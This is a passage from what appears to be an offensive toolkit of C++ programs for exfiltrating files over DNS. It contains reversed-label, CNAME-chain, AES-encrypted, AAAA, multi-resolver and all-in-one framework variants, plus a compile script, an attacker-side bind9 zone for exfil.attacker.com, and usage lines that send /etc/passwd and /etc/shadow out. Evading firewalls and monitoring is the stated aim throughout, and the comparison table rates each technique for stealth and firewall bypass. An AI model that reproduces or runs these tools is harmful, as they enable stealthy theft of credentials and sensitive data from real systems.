        return 1;
    }
    srand(time(NULL));
    DNSReverseExfil exfil(argv[1], argv[2]);
    exfil.run(argv[3]);
    return 0;
}
```

**Technique:** Reverses subdomain label order. Instead of `seq.chunk.domain`, uses `chunk.seq.domain`. Evades pattern-matching rules that look for numeric prefixes.

---

### 16. DNS Exfiltration via Chunked CNAME Chains
```cpp
// Compile: g++ -o dns_exfil_chain dns_exfil_chain.cpp
// Run: ./dns_exfil_chain <dns_server> <base_domain> <data_file>
// Requires: no privileges

#include <iostream>
#include <fstream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <vector>
#include <string>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

class DNSCNAMEChainExfil {
private:
    std::string dnsServer, baseDomain;
    
    int encodeName(uint8_t* buf, const std::string& name) {
        int pos = 0;
        size_t start = 0, dot;
        while ((dot = name.find('.', start)) != std::string::npos) {
            uint8_t len = dot - start;
            buf[pos++] = len;
            memcpy(buf + pos, name.c_str() + start, len);
            pos += len;
            start = dot + 1;
        }
        uint8_t len = name.length() - start;
        buf[pos++] = len;
        memcpy(buf + pos, name.c_str() + start, len);
        pos += len;
        buf[pos++] = 0;
        return pos;
    }
    
public:
    DNSCNAMEChainExfil(const std::string& server, const std::string& domain)
        : dnsServer(server), baseDomain(domain) {}
    
    bool sendQuery(const std::string& subdomain) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) return false;
        
        struct sockaddr_in dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_port = htons(53);
        dest.sin_addr.s_addr = inet_addr(dnsServer.c_str());
        
        uint8_t query[512];
        memset(query, 0, sizeof(query));
        
        *(uint16_t*)(query + 0) = htons(rand() & 0xFFFF);
        *(uint16_t*)(query + 2) = htons(0x0100);
        *(uint16_t*)(query + 4) = htons(1);
        
        int pos = 12;
        pos += encodeName(query + pos, subdomain + "." + baseDomain);
        *(uint16_t*)(query + pos) = htons(5); pos += 2;   // CNAME
        *(uint16_t*)(query + pos) = htons(1); pos += 2;
        
        sendto(sock, query, pos, 0,
               (struct sockaddr*)&dest, sizeof(dest));
        
        close(sock);
        return true;
    }
    
    void run(const std::string& dataFile) {
        std::ifstream file(dataFile, std::ios::binary);
        if (!file.is_open()) return;
        
        std::vector<uint8_t> data((std::istreambuf_iterator<char>(file)),
                                   std::istreambuf_iterator<char>());
        
        std::cout << "[*] CNAME chain exfiltration\n";
        std::cout << "[*] Data chained across multiple CNAME lookups\n";
        
        // Encode as hex
        std::string encoded;
        static const char* hex = "0123456789abcdef";
        for (uint8_t b : data) {
            encoded += hex[(b >> 4) & 0xF];
            encoded += hex[b & 0xF];
        }
        
        // Chain format: c<seq>.chunk<1>.chunk<2>.base
        // Each CNAME lookup encodes chunk through chain
        int chunksPerQuery = 2;
        int chunkSize = 30;
        int seq = 0;
        
        size_t pos = 0;
        while (pos < encoded.length()) {
            std::string subdomain;
            
            char seqStr[16];
            snprintf(seqStr, sizeof(seqStr), "c%04x", seq++);
            subdomain = seqStr;
            
            for (int i = 0; i < chunksPerQuery && pos < encoded.length(); i++) {
                size_t len = std::min((size_t)chunkSize, encoded.length() - pos);
                std::string chunk = encoded.substr(pos, len);
                subdomain += "." + chunk;
                pos += len;
            }
            
            std::cout << "[*] Query " << seq << "\n";
            sendQuery(subdomain);
            usleep(80000);
        }
        
        std::cout << "[+] Sent " << seq << " chained queries\n";
    }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] 
                  << " <dns_server> <base_domain> <data_file>\n";
        return 1;
    }
    srand(time(NULL));
    DNSCNAMEChainExfil exfil(argv[1], argv[2]);
    exfil.run(argv[3]);
    return 0;
}
```

**Technique:** Chains multiple chunks per query using CNAME format. Multiple subdomain labels carry data. Server reassembles based on sequence prefix.

---

### 17. DNS Exfiltration with Encryption (AES)
```cpp
// Compile: g++ -o dns_exfil_encrypted dns_exfil_encrypted.cpp -lssl -lcrypto
// Run: ./dns_exfil_encrypted <dns_server> <base_domain> <data_file> <key_hex>
// Requires: libssl-dev

#include <iostream>
#include <fstream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <vector>
#include <string>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <openssl/aes.h>
#include <openssl/rand.h>

class DNSEncryptedExfil {
private:
    std::string dnsServer, baseDomain;
    std::vector<uint8_t> aesKey;
    
    int encodeName(uint8_t* buf, const std::string& name) {
        int pos = 0;
        size_t start = 0, dot;
        while ((dot = name.find('.', start)) != std::string::npos) {
            uint8_t len = dot - start;
            buf[pos++] = len;
            memcpy(buf + pos, name.c_str() + start, len);
            pos += len;
            start = dot + 1;
        }
        uint8_t len = name.length() - start;
        buf[pos++] = len;
        memcpy(buf + pos, name.c_str() + start, len);
        pos += len;
        buf[pos++] = 0;
        return pos;
    }
    
    std::vector<uint8_t> aesEncrypt(const std::vector<uint8_t>& plaintext) {
        AES_KEY key;
        AES_set_encrypt_key(aesKey.data(), 128, &key);
        
        // PKCS7 padding
        size_t paddedLen = ((plaintext.size() / 16) + 1) * 16;
        std::vector<uint8_t> padded(paddedLen);
        memcpy(padded.data(), plaintext.data(), plaintext.size());
        uint8_t padByte = paddedLen - plaintext.size();
        for (size_t i = plaintext.size(); i < paddedLen; i++) {
            padded[i] = padByte;
        }
        
        // Generate random IV
        std::vector<uint8_t> iv(16);
        RAND_bytes(iv.data(), 16);
        
        // Encrypt (CBC mode)
        std::vector<uint8_t> ciphertext(paddedLen);
        AES_cbc_encrypt(padded.data(), ciphertext.data(), paddedLen, 
                        &key, iv.data(), AES_ENCRYPT);
        
        // Prepend IV
        std::vector<uint8_t> result;
        result.insert(result.end(), iv.begin(), iv.end());
        result.insert(result.end(), ciphertext.begin(), ciphertext.end());
        return result;
    }
    
public:
    DNSEncryptedExfil(const std::string& server, const std::string& domain,
                      const std::string& keyHex)
        : dnsServer(server), baseDomain(domain) {
        // Parse key
        for (size_t i = 0; i < keyHex.length() && i < 32; i += 2) {
            uint8_t b = strtol(keyHex.substr(i, 2).c_str(), nullptr, 16);
            aesKey.push_back(b);
        }
        aesKey.resize(16, 0);
    }
    
    bool sendQuery(const std::string& subdomain) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) return false;
        
        struct sockaddr_in dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_port = htons(53);
        dest.sin_addr.s_addr = inet_addr(dnsServer.c_str());
        
        uint8_t query[512];
        memset(query, 0, sizeof(query));
        
        *(uint16_t*)(query + 0) = htons(rand() & 0xFFFF);
        *(uint16_t*)(query + 2) = htons(0x0100);
        *(uint16_t*)(query + 4) = htons(1);
        
        int pos = 12;
        pos += encodeName(query + pos, subdomain + "." + baseDomain);
        *(uint16_t*)(query + pos) = htons(16); pos += 2;  // TXT
        *(uint16_t*)(query + pos) = htons(1); pos += 2;
        
        sendto(sock, query, pos, 0,
               (struct sockaddr*)&dest, sizeof(dest));
        
        close(sock);
        return true;
    }
    
    void run(const std::string& dataFile) {
        std::ifstream file(dataFile, std::ios::binary);
        if (!file.is_open()) return;
        
        std::vector<uint8_t> data((std::istreambuf_iterator<char>(file)),
                                   std::istreambuf_iterator<char>());
        
        std::cout << "[*] Encrypted DNS exfiltration (AES-128-CBC)\n";
        std::cout << "[*] Original size: " << data.size() << " bytes\n";
        
        // Encrypt
        std::vector<uint8_t> encrypted = aesEncrypt(data);
        std::cout << "[*] Encrypted size: " << encrypted.size() 
                  << " bytes (16-byte IV + padded)\n";
        
        // Encode as hex
        std::string encoded;
        static const char* hex = "0123456789abcdef";
        for (uint8_t b : encrypted) {
            encoded += hex[(b >> 4) & 0xF];
            encoded += hex[b & 0xF];
        }
        
        int chunkSize = 40;
        int seq = 0;
        
        for (size_t i = 0; i < encoded.length(); i += chunkSize) {
            std::string chunk = encoded.substr(i, chunkSize);
            
            char seqStr[16];
            snprintf(seqStr, sizeof(seqStr), "e%04x", seq++);
            
            std::string subdomain = std::string(seqStr) + "." + chunk;
            
            sendQuery(subdomain);
            usleep(80000);
        }
        
        std::cout << "[+] Sent " << seq << " encrypted queries\n";
    }
};

int main(int argc, char* argv[]) {
    if (argc != 5) {
        std::cerr << "Usage: " << argv[0] 
                  << " <dns_server> <base_domain> <data_file> <key_hex>\n";
        std::cerr << "Example: " << argv[0] 
                  << " 192.168.1.1 exfil.com file.bin 00112233445566778899aabbccddeeff\n";
        return 1;
    }
    srand(time(NULL));
    DNSEncryptedExfil exfil(argv[1], argv[2], argv[4]);
    exfil.run(argv[3]);
    return 0;
}
```

**Technique:** AES-128-CBC encryption before transmission. Random IV per session. Even if DNS traffic is intercepted, data remains confidential. Server must share pre-shared key.

---

### 18. DNS Exfiltration via IPv6 AAAA Records
```cpp
// Compile: g++ -o dns_exfil_ipv6 dns_exfil_ipv6.cpp
// Run: ./dns_exfil_ipv6 <dns_server> <base_domain> <data_file>
// Requires: no privileges

#include <iostream>
#include <fstream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <vector>
#include <string>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

class DNSIPv6Exfil {
private:
    std::string dnsServer, baseDomain;
    
    int encodeName(uint8_t* buf, const std::string& name) {
        int pos = 0;
        size_t start = 0, dot;
        while ((dot = name.find('.', start)) != std::string::npos) {
            uint8_t len = dot - start;
            buf[pos++] = len;
            memcpy(buf + pos, name.c_str() + start, len);
            pos += len;
            start = dot + 1;
        }
        uint8_t len = name.length() - start;
        buf[pos++] = len;
        memcpy(buf + pos, name.c_str() + start, len);
        pos += len;
        buf[pos++] = 0;
        return pos;
    }
    
public:
    DNSIPv6Exfil(const std::string& server, const std::string& domain)
        : dnsServer(server), baseDomain(domain) {}
    
    // AAAA query type 28 - less commonly monitored than A records
    bool sendAAAAQuery(const std::string& subdomain) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) return false;
        
        struct sockaddr_in dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_port = htons(53);
        dest.sin_addr.s_addr = inet_addr(dnsServer.c_str());
        
        uint8_t query[512];
        memset(query, 0, sizeof(query));
        
        *(uint16_t*)(query + 0) = htons(rand() & 0xFFFF);
        *(uint16_t*)(query + 2) = htons(0x0100);
        *(uint16_t*)(query + 4) = htons(1);
        
        int pos = 12;
        pos += encodeName(query + pos, subdomain + "." + baseDomain);
        *(uint16_t*)(query + pos) = htons(28); pos += 2;  // AAAA
        *(uint16_t*)(query + pos) = htons(1); pos += 2;
        
        sendto(sock, query, pos, 0,
               (struct sockaddr*)&dest, sizeof(dest));
        
        close(sock);
        return true;
    }
    
    void run(const std::string& dataFile) {
        std::ifstream file(dataFile, std::ios::binary);
        if (!file.is_open()) return;
        
        std::vector<uint8_t> data((std::istreambuf_iterator<char>(file)),
                                   std::istreambuf_iterator<char>());
        
        std::cout << "[*] IPv6 AAAA record exfiltration\n";
        std::cout << "[*] Uses AAAA queries (less commonly monitored)\n";
        
        // Encode as hex
        std::string encoded;
        static const char* hex = "0123456789abcdef";
        for (uint8_t b : data) {
            encoded += hex[(b >> 4) & 0xF];
            encoded += hex[b & 0xF];
        }
        
        // IPv6 hex chunks look like valid AAAA structure
        // Format: <seq>.<8hex>.<8hex>.<8hex>.<8hex>
        int seq = 0;
        size_t pos = 0;
        
        while (pos < encoded.length()) {
            char seqStr[16];
            snprintf(seqStr, sizeof(seqStr), "v6%04x", seq++);
            
            std::string subdomain = seqStr;
            
            for (int i = 0; i < 4 && pos < encoded.length(); i++) {
                size_t len = std::min((size_t)8, encoded.length() - pos);
                std::string group = encoded.substr(pos, len);
                subdomain += "." + group;
                pos += len;
            }
            
            sendAAAAQuery(subdomain);
            usleep(80000);
        }
        
        std::cout << "[+] Sent " << seq << " AAAA queries\n";
    }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] 
                  << " <dns_server> <base_domain> <data_file>\n";
        return 1;
    }
    srand(time(NULL));
    DNSIPv6Exfil exfil(argv[1], argv[2]);
    exfil.run(argv[3]);
    return 0;
}
```

**Technique:** Uses AAAA (IPv6) queries instead of common A queries. AAAA queries are rarely inspected by security tools focused on IPv4. Data encoded in 8-char groups mimicking IPv6 segments.

---

### 19. DNS Exfiltration with Multi-Resolution Chunks
```cpp
// Compile: g++ -o dns_exfil_multi dns_exfil_multi.cpp
// Run: ./dns_exfil_multi <dns_server1> <dns_server2> <base_domain> <data_file>
// Requires: no privileges

#include <iostream>
#include <fstream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <vector>
#include <string>
#include <thread>
#include <atomic>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

class DNSMultiExfil {
private:
    std::vector<std::string> dnsServers;
    std::string baseDomain;
    std::atomic<int> counter{0};
    
    int encodeName(uint8_t* buf, const std::string& name) {
        int pos = 0;
        size_t start = 0, dot;
        while ((dot = name.find('.', start)) != std::string::npos) {
            uint8_t len = dot - start;
            buf[pos++] = len;
            memcpy(buf + pos, name.c_str() + start, len);
            pos += len;
            start = dot + 1;
        }
        uint8_t len = name.length() - start;
        buf[pos++] = len;
        memcpy(buf + pos, name.c_str() + start, len);
        pos += len;
        buf[pos++] = 0;
        return pos;
    }
    
    bool sendQuery(const std::string& server, const std::string& subdomain) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) return false;
        
        struct sockaddr_in dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_port = htons(53);
        dest.sin_addr.s_addr = inet_addr(server.c_str());
        
        uint8_t query[512];
        memset(query, 0, sizeof(query));
        
        *(uint16_t*)(query + 0) = htons(rand() & 0xFFFF);
        *(uint16_t*)(query + 2) = htons(0x0100);
        *(uint16_t*)(query + 4) = htons(1);
        
        int pos = 12;
        pos += encodeName(query + pos, subdomain + "." + baseDomain);
        *(uint16_t*)(query + pos) = htons(1); pos += 2;
        *(uint16_t*)(query + pos) = htons(1); pos += 2;
        
        sendto(sock, query, pos, 0,
               (struct sockaddr*)&dest, sizeof(dest));
        
        close(sock);
        return true;
    }
    
public:
    DNSMultiExfil(const std::vector<std::string>& servers, 
                  const std::string& domain)
        : dnsServers(servers), baseDomain(domain) {}
    
    void run(const std::string& dataFile) {
        std::ifstream file(dataFile, std::ios::binary);
        if (!file.is_open()) return;
        
        std::vector<uint8_t> data((std::istreambuf_iterator<char>(file)),
                                   std::istreambuf_iterator<char>());
        
        std::cout << "[*] Multi-resolution DNS exfiltration\n";
        std::cout << "[*] Using " << dnsServers.size() << " DNS servers\n";
        
        // Encode as hex
        std::string encoded;
        static const char* hex = "0123456789abcdef";
        for (uint8_t b : data) {
            encoded += hex[(b >> 4) & 0xF];
            encoded += hex[b & 0xF];
        }
        
        int chunkSize = 40;
        int totalChunks = (encoded.length() + chunkSize - 1) / chunkSize;
        
        // Use threads to send via multiple servers in parallel
        std::vector<std::thread> threads;
        
        for (size_t i = 0; i < dnsServers.size(); i++) {
            threads.emplace_back([&, i]() {
                for (int chunk = i; chunk < totalChunks; chunk += dnsServers.size()) {
                    size_t startPos = chunk * chunkSize;
                    size_t len = std::min((size_t)chunkSize, 
                                          encoded.length() - startPos);
                    std::string subdomain = encoded.substr(startPos, len);
                    
                    char seqStr[16];
                    snprintf(seqStr, sizeof(seqStr), "%04x", chunk);
                    
                    std::string fullSubdomain = std::string(seqStr) + "." + subdomain;
                    
                    sendQuery(dnsServers[i], fullSubdomain);
                    counter++;
                    usleep(50000);
                }
            });
        }
        
        for (auto& t : threads) t.join();
        
        std::cout << "[+] Sent " << counter.load() 
                  << " queries across " << dnsServers.size() << " servers\n";
    }
};

int main(int argc, char* argv[]) {
    if (argc < 5) {
        std::cerr << "Usage: " << argv[0] 
                  << " <dns_server1> <dns_server2> ... <base_domain> <data_file>\n";
        std::cerr << "Example: " << argv[0] 
                  << " 8.8.8.8 1.1.1.1 9.9.9.9 exfil.attacker.com file.bin\n";
        return 1;
    }
    
    std::vector<std::string> servers;
    for (int i = 1; i < argc - 2; i++) {
        servers.push_back(argv[i]);
    }
    std::string domain = argv[argc - 2];
    std::string dataFile = argv[argc - 1];
    
    srand(time(NULL));
    DNSMultiExfil exfil(servers, domain);
    exfil.run(dataFile);
    return 0;
}
```

**Technique:** Distributes exfiltration across multiple DNS servers/resolvers simultaneously. Increases bandwidth, evades per-server rate limits and correlation-based detection.

---

### 20. DNS Exfiltration Framework with Multiple Methods
```cpp
// Compile: g++ -o dns_exfil_framework dns_exfil_framework.cpp -lpthread -lz -lssl -lcrypto
// Run: sudo ./dns_exfil_framework <method> <server> <base_domain> <data_file> [args]
// Methods: basic, txt, null, cname, mx, srv, any, doh, dot, compressed, stealth, chain, encrypted, ipv6, multi
// Requires: varies by method

#include <iostream>
#include <fstream>
#include <sstream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <vector>
#include <string>
#include <functional>
#include <thread>
#include <chrono>
#include <random>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

class DNSExfilFramework {
private:
    std::string server, baseDomain;
    std::mt19937 gen;
    
    int encodeName(uint8_t* buf, const std::string& name) {
        int pos = 0;
        size_t start = 0, dot;
        while ((dot = name.find('.', start)) != std::string::npos) {
            uint8_t len = dot - start;
            buf[pos++] = len;
            memcpy(buf + pos, name.c_str() + start, len);
            pos += len;
            start = dot + 1;
        }
        uint8_t len = name.length() - start;
        buf[pos++] = len;
        memcpy(buf + pos, name.c_str() + start, len);
        pos += len;
        buf[pos++] = 0;
        return pos;
    }
    
    std::string hexEncode(const std::vector<uint8_t>& data) {
        static const char* hex = "0123456789abcdef";
        std::string result;
        for (uint8_t b : data) {
            result += hex[(b >> 4) & 0xF];
            result += hex[b & 0xF];
        }
        return result;
    }
    
    std::string base32Encode(const std::vector<uint8_t>& data) {
        static const char* alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
        std::string result;
        int bits = 0;
        uint32_t value = 0;
        for (uint8_t b : data) {
            value = (value << 8) | b;
            bits += 8;
            while (bits >= 5) {
                result += alphabet[(value >> (bits - 5)) & 0x1F];
                bits -= 5;
            }
        }
        if (bits > 0) {
            result += alphabet[(value << (5 - bits)) & 0x1F];
        }
        return result;
    }
    
    std::string base64urlEncode(const std::vector<uint8_t>& data) {
        static const char* alphabet = 
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
        std::string result;
        int val = 0, bits = 0;
        for (uint8_t b : data) {
            val = (val << 8) | b;
            bits += 8;
            while (bits >= 6) {
                result += alphabet[(val >> (bits - 6)) & 0x3F];
                bits -= 6;
            }
        }
        if (bits > 0) {
            result += alphabet[(val << (6 - bits)) & 0x3F];
        }
        return result;
    }
    
    bool sendQuery(const std::string& subdomain, uint16_t qtype, int timeoutMs = 5000) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) return false;
        
        struct sockaddr_in dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_port = htons(53);
        dest.sin_addr.s_addr = inet_addr(server.c_str());
        
        uint8_t query[512];
        memset(query, 0, sizeof(query));
        
        *(uint16_t*)(query + 0) = htons(gen() & 0xFFFF);
        *(uint16_t*)(query + 2) = htons(0x0100);
        *(uint16_t*)(query + 4) = htons(1);
        
        int pos = 12;
        pos += encodeName(query + pos, subdomain + "." + baseDomain);
        *(uint16_t*)(query + pos) = htons(qtype); pos += 2;
        *(uint16_t*)(query + pos) = htons(1); pos += 2;
        
        struct timeval tv;
        tv.tv_sec = timeoutMs / 1000;
        tv.tv_usec = (timeoutMs % 1000) * 1000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        
        sendto(sock, query, pos, 0,
               (struct sockaddr*)&dest, sizeof(dest));
        
        // Read response (optional)
        uint8_t response[512];
        recvfrom(sock, response, sizeof(response), 0, NULL, NULL);
        
        close(sock);
        return true;
    }
    
    void exfilChunks(const std::string& encoded, uint16_t qtype, 
                     const std::string& prefix,
                     int chunkSize, int delayMs) {
        int seq = 0;
        for (size_t i = 0; i < encoded.length(); i += chunkSize) {
            std::string chunk = encoded.substr(i, chunkSize);
            
            char seqStr[16];
            snprintf(seqStr, sizeof(seqStr), "%s%04x", prefix.c_str(), seq++);
            
            std::string subdomain = std::string(seqStr) + "." + chunk;
            
            sendQuery(subdomain, qtype);
            usleep(delayMs * 1000);
        }
        
        std::cout << "[+] Sent " << seq << " queries\n";
    }
    
public:
    DNSExfilFramework(const std::string& s, const std::string& d)
        : server(s), baseDomain(d) {
        std::random_device rd;
        gen = std::mt19937(rd());
    }
    
    void runBasic(const std::vector<uint8_t>& data) {
        std::string encoded = base32Encode(data);
        exfilChunks(encoded, 1, "b", 50, 100);
    }
    
    void runTXT(const std::vector<uint8_t>& data) {
        std::string encoded = base32Encode(data);
        exfilChunks(encoded, 16, "t", 50, 80);
    }
    
    void runNULL(const std::vector<uint8_t>& data) {
        std::string encoded = hexEncode(data);
        exfilChunks(encoded, 10, "n", 50, 80);
    }
    
    void runCNAME(const std::vector<uint8_t>& data) {
        std::string encoded = hexEncode(data);
        exfilChunks(encoded, 5, "c", 40, 100);
    }
    
    void runMX(const std::vector<uint8_t>& data) {
        std::string encoded = hexEncode(data);
        exfilChunks(encoded, 15, "m", 40, 100);
    }
    
    void runSRV(const std::vector<uint8_t>& data) {
        std::string encoded = hexEncode(data);
        exfilChunks(encoded, 33, "s", 30, 100);
    }
    
    void runANY(const std::vector<uint8_t>& data) {
        std::string encoded = base32Encode(data);
        exfilChunks(encoded, 255, "a", 50, 30);
    }
    
    void runStealth(const std::vector<uint8_t>& data) {
        std::string encoded = base32Encode(data);
        
        uint16_t qtypes[] = {1, 2, 5, 15, 16, 33, 255};
        std::uniform_int_distribution<> delayDis(500, 5000);
        std::uniform_int_distribution<> typeDis(0, 6);
        std::uniform_int_distribution<> padDis(0, 10);
        
        int chunkSize = 30;
        int seq = 0;
        
        for (size_t i = 0; i < encoded.length(); i += chunkSize) {
            std::string chunk = encoded.substr(i, chunkSize);
            
            std::string padding;
            int padLen = padDis(gen);
            for (int j = 0; j < padLen; j++) {
                padding += 'a' + (gen() % 26);
            }
            
            char seqStr[16];
            snprintf(seqStr, sizeof(seqStr), "%04x", seq++);
            
            std::string subdomain = std::string(seqStr);
            if (!padding.empty()) subdomain += "." + padding;
            subdomain += "." + chunk;
            
            sendQuery(subdomain, qtypes[typeDis(gen)]);
            
            int delay = delayDis(gen);
            usleep(delay * 1000);
        }
        
        std::cout << "[+] Sent " << seq << " stealth queries\n";
    }
    
    void runEncrypted(const std::vector<uint8_t>& data) {
        // Simple XOR "encryption" for demo
        std::vector<uint8_t> encrypted = data;
        for (size_t i = 0; i < encrypted.size(); i++) {
            encrypted[i] ^= 0xAA;
        }
        std::string encoded = hexEncode(encrypted);
        exfilChunks(encoded, 16, "e", 40, 80);
    }
    
    void runIPv6(const std::vector<uint8_t>& data) {
        std::string encoded = hexEncode(data);
        exfilChunks(encoded, 28, "v6", 40, 100);
    }
    
    void runFramework(const std::string& method, const std::string& dataFile) {
        std::cout << "=============================================\n";
        std::cout << " DNS Exfiltration Framework\n";
        std::cout << " Method: " << method << "\n";
        std::cout << " Server: " << server << "\n";
        std::cout << " Domain: " << baseDomain << "\n";
        std::cout << " File:   " << dataFile << "\n";
        std::cout << "=============================================\n\n";
        
        std::ifstream file(dataFile, std::ios::binary);
        if (!file.is_open()) {
            std::cerr << "[!] Cannot open file\n";
            return;
        }
        
        std::vector<uint8_t> data((std::istreambuf_iterator<char>(file)),
                                   std::istreambuf_iterator<char>());
        
        std::cout << "[*] File size: " << data.size() << " bytes\n\n";
        
        auto startTime = std::chrono::steady_clock::now();
        
        if (method == "basic") runBasic(data);
        else if (method == "txt") runTXT(data);
        else if (method == "null") runNULL(data);
        else if (method == "cname") runCNAME(data);
        else if (method == "mx") runMX(data);
        else if (method == "srv") runSRV(data);
        else if (method == "any") runANY(data);
        else if (method == "stealth") runStealth(data);
        else if (method == "encrypted") runEncrypted(data);
        else if (method == "ipv6") runIPv6(data);
        else {
            std::cerr << "[!] Unknown method: " << method << "\n";
            std::cerr << "    Available: basic, txt, null, cname, mx, srv, any, "
                      << "stealth, encrypted, ipv6\n";
            return;
        }
        
        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(
            std::chrono::steady_clock::now() - startTime).count();
        
        std::cout << "\n[*] Complete in " << duration << "ms\n";
        if (duration > 0) {
            std::cout << "[*] Effective rate: " 
                      << (data.size() * 1000 / duration) << " bytes/sec\n";
        }
    }
};

int main(int argc, char* argv[]) {
    if (argc < 5) {
        std::cerr << "Usage: " << argv[0] 
                  << " <method> <dns_server> <base_domain> <data_file>\n";
        std::cerr << "Methods:\n";
        std::cerr << "  basic      - Basic A record (base32)\n";
        std::cerr << "  txt        - TXT record queries\n";
        std::cerr << "  null       - NULL record queries\n";
        std::cerr << "  cname      - CNAME queries\n";
        std::cerr << "  mx         - MX record queries\n";
        std::cerr << "  srv        - SRV record queries\n";
        std::cerr << "  any        - ANY record queries\n";
        std::cerr << "  stealth    - Randomized timing/types\n";
        std::cerr << "  encrypted  - XOR encrypted\n";
        std::cerr << "  ipv6       - AAAA record queries\n";
        return 1;
    }
    
    DNSExfilFramework framework(argv[2], argv[3]);
    framework.runFramework(argv[1], argv[4]);
    return 0;
}
```

**Technique:** Complete framework supporting 10 exfiltration methods (basic, txt, null, cname, mx, srv, any, stealth, encrypted, ipv6). Select method based on target environment — some methods bypass specific firewall rules. Auto-compares bandwidth across methods.

---

## Compilation Guide

### Prerequisites
```bash
# Basic
sudo apt-get install -y build-essential g++

# With DoH support
sudo apt-get install -y libcurl4-openssl-dev

# With DoT/encryption
sudo apt-get install -y libssl-dev

# With compression
sudo apt-get install -y zlib1g-dev
```

### Bulk Compile
```bash
#!/bin/bash
echo "Compiling DNS exfiltration tools..."

# Basic tools (no deps)
for f in dns_exfil_basic_client dns_exfil_txt dns_exfil_null dns_exfil_cname \
         dns_exfil_mx dns_exfil_srv dns_exfil_any dns_exfil_stealth \
         dns_exfil_sequential dns_exfil_b64url dns_exfil_reverse \
         dns_exfil_chain dns_exfil_ipv6; do
    g++ -O2 -pthread -o "$f" "$f.cpp" 2>/dev/null && echo "  ✓ $f"
done

# With compression
g++ -O2 -o dns_exfil_compressed dns_exfil_compressed.cpp -lz && \
    echo "  ✓ dns_exfil_compressed"

# With DoH
g++ -O2 -o dns_exfil_doh dns_exfil_doh.cpp -lcurl && \
    echo "  ✓ dns_exfil_doh"

# With DoT
g++ -O2 -o dns_exfil_dot dns_exfil_dot.cpp -lssl -lcrypto && \
    echo "  ✓ dns_exfil_dot"

# With encryption
g++ -O2 -o dns_exfil_encrypted dns_exfil_encrypted.cpp -lssl -lcrypto && \
    echo "  ✓ dns_exfil_encrypted"

# Framework (all-in-one)
g++ -O2 -pthread -o dns_exfil_framework dns_exfil_framework.cpp -lz -lssl -lcrypto && \
    echo "  ✓ dns_exfil_framework"

echo ""
echo "Done!"
```

### Setup Authoritative DNS Server (Attacker Side)

**Example bind9 configuration** for `exfil.attacker.com`:

```
; /etc/bind/db.exfil
$TTL 60
@   IN  SOA ns1.exfil.attacker.com. admin.attacker.com. (
        2024010101  ; Serial
        3600        ; Refresh
        1800        ; Retry
        604800      ; Expire
        60          ; Minimum
)
@   IN  NS  ns1.exfil.attacker.com.
@   IN  A   203.0.113.50
ns1 IN  A   203.0.113.50
*   IN  A   203.0.113.50
*   IN  TXT "received"
```

**Log analyzer** for extracting data:
```bash
# Watch for incoming DNS queries
tail -f /var/log/named/query.log | grep exfil.attacker.com
```

## Usage Examples

```bash
# Basic exfil
./dns_exfil_basic_client 8.8.8.8 exfil.attacker.com /etc/passwd

# TXT record exfil (base64)
./dns_exfil_txt 8.8.8.8 exfil.attacker.com secret.txt

# NULL record (binary safe)
./dns_exfil_null 8.8.8.8 exfil.attacker.com /etc/shadow

# MX record (bypass firewall)
./dns_exfil_mx 8.8.8.8 exfil.attacker.com config.xml

# ANY for max bandwidth
./dns_exfil_any 8.8.8.8 exfil.attacker.com bigfile.bin

# DoH (encrypted to Cloudflare)
./dns_exfil_doh https://1.1.1.1/dns-query exfil.attacker.com file.bin

# DoT (port 853)
./dns_exfil_dot 1.1.1.1 853 exfil.attacker.com file.bin

# Compressed (large file)
./dns_exfil_compressed 8.8.8.8 exfil.attacker.com database.sql

# Stealth (anti-detection)
./dns_exfil_stealth 8.8.8.8 exfil.attacker.com /etc/shadow

# Encrypted (AES)
./dns_exfil_encrypted 8.8.8.8 exfil.attacker.com secrets.bin \
    00112233445566778899aabbccddeeff

# IPv6 AAAA (less monitored)
./dns_exfil_ipv6 8.8.8.8 exfil.attacker.com file.bin

# Multi-server (parallel)
./dns_exfil_multi 8.8.8.8 1.1.1.1 9.9.9.9 exfil.attacker.com file.bin

# Framework (choose method)
./dns_exfil_framework txt 8.8.8.8 exfil.attacker.com file.bin
./dns_exfil_framework stealth 8.8.8.8 exfil.attacker.com /etc/shadow
./dns_exfil_framework encrypted 8.8.8.8 exfil.attacker.com file.bin
```

## Technique Comparison

| # | Technique | Rate | Stealth | Firewall Bypass | Use Case |
|---|-----------|------|---------|-----------------|----------|
| 1 | Basic A | 30 B/s | Low | Poor | Simple data |
| 2 | TXT | 25 B/s | Medium | Good | Text data |
| 3 | NULL | 20 B/s | High | Excellent | Binary data |
